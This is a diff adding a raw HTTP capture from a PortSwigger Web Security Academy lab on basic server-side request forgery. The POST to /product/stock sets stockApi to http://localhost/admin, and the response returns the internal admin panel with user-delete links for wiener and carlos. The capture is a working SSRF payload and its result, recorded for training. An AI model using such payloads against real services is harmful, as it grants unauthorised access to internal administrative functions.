@@ -1,0 +1,91 @@
+POST https://0a16008d04df75d58258b0ab006000f3.web-security-academy.net/product/stock HTTP/1.1
+host: 0a16008d04df75d58258b0ab006000f3.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Referer: https://0a16008d04df75d58258b0ab006000f3.web-security-academy.net/product?productId=1
+Content-Type: application/x-www-form-urlencoded
+content-length: 31
+Origin: https://0a16008d04df75d58258b0ab006000f3.web-security-academy.net
+Connection: keep-alive
+Cookie: session=63qX6atorsqRqsBgOutIGRicG3vyKtXg
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Priority: u=0
+
+stockApi=http://localhost/adminHTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+Cache-Control: no-cache
+Set-Cookie: session=UeumtBmR1ZdfTbNc7nlOPuQXRvmSFHiN; Secure; HttpOnly; SameSite=None
+X-Frame-Options: SAMEORIGIN
+Content-Encoding: gzip
+Connection: close
+Content-Length: 3070
+
+<!DOCTYPE html>
+<html>
+    <head>
+        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
+        <link href=/resources/css/labs.css rel=stylesheet>
+        <title>Basic SSRF against the local server</title>
+    </head>
+    <body>
+        <script src="/resources/labheader/js/labHeader.js"></script>
+        <div id="academyLabHeader">
+            <section class='academyLabBanner'>
+                <div class=container>
+                    <div class=logo></div>
+                        <div class=title-container>
+                            <h2>Basic SSRF against the local server</h2>
+                            <a class=link-back href='https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost'>
+                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
+                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
+                                    <g>
+                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
+                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
+                                    </g>
+                                </svg>
+                            </a>
+                        </div>
+                        <div class='widgetcontainer-lab-status is-notsolved'>
+                            <span>LAB</span>
+                            <p>Not solved</p>
+                            <span class=lab-status-icon></span>
+                        </div>
+                    </div>
+                </div>
+            </section>
+        </div>
+        <div theme="">
+            <section class="maincontainer">
+                <div class="container is-page">
+                    <header class="navigation-header">
+                        <section class="top-links">
+                            <a href=/>Home</a><p>|</p>
+                            <a href="/admin">Admin panel</a><p>|</p>
+                            <a href="/my-account">My account</a><p>|</p>
+                        </section>
+                    </header>
+                    <header class="notification-header">
+                    </header>
+                    <section>
+                        <h1>Users</h1>
+                        <div>
+                            <span>wiener - </span>
+                            <a href="/admin/delete?username=wiener">Delete</a>
+                        </div>
+                        <div>
+                            <span>carlos - </span>
+                            <a href="/admin/delete?username=carlos">Delete</a>
+                        </div>
+                    </section>
+                    <br>
+                    <hr>
+                </div>
+            </section>
+            <div class="footer-wrapper">
+            </div>
+        </div>
+    </body>
+</html>
